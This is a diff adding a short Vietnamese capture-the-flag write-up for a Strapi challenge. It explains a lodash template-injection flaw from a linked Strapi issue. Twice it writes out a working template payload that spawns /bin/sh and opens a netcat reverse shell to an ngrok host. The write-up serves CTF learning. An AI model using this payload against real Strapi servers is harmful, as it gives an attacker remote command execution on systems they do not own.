@@ -278,3 +278,24 @@ find / -type d 2>/dev/null | grep 'io'
 Lấy flag:
 
 <img width="764" alt="image" src="https://github.com/rayinaw/ctf-challenges/assets/108481122/8a804fa2-7b75-47ad-b917-02cd707c0d5e">
+
+## Strapi
+
+Bài này mình không giải được, tìm thấy lỗ hổng rồi nhưng mà cái plugin rối quá lười làm cmnl.
+
+https://github.com/strapi/strapi/issues/16730
+
+Bug của nó là do `<%- value %>` không hoạt động được nên strapi nó không cấm `<%= value %>` và để người dùng tự filter. Do đó tác giả sử dụng lỗ hổng này và không filter gì cả. 
+
+Trong issue trên cũng nói này là của lodash nên mình có search ra payload sau:
+```js
+${x=Object}${w=a=new x}${w.type="pipe"}${w.readable=1}${w.writable=1}${a.file="/bin/sh"}${a.args=["/bin/sh","-c","rm -f /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc 0.tcp.ap.ngrok.io 17965 >/tmp/f"]}${a.stdio=[w,w]}${process.binding("spawn_sync").spawn(a).output}
+```
+Link: https://twitter.com/rootxharsh/status/1268181937127997446
+
+Payload reverse shell lấy ở [đây](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#netcat-busybox).
+
+Full payload:
+```js
+<%= `${x=Object}${w=a=new x}${w.type="pipe"}${w.readable=1}${w.writable=1}${a.file="/bin/sh"}${a.args=["/bin/sh","-c","rm -f /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc 0.tcp.ap.ngrok.io 17965 >/tmp/f"]}${a.stdio=[w,w]}${process.binding("spawn_sync").spawn(a).output}` %>
+```
